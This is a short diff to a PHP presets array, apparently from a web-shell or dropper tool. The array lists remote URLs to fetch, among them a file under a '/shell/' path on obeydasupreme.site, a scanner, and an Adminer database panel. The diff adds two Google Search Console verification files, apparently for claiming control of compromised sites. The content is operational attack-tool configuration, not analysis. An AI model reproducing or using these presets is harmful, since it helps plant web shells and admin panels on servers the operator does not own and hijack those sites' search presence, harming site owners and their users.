@@ -91,6 +91,8 @@ $presets = [
     'LADEV' => 'https://obeydasupreme.site/shell/okeoce.txt',
     'SCANNER' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/security1.txt',
     'ADMINER' => 'https://raw.githubusercontent.com/yourfr13nds/backburner/main/adminer.php',
+    'GSC' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/google63c1b42f5347f5ee.html',
+    'GSC 2' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/google29ba1fdf141689ea.html',
 
 ];
 
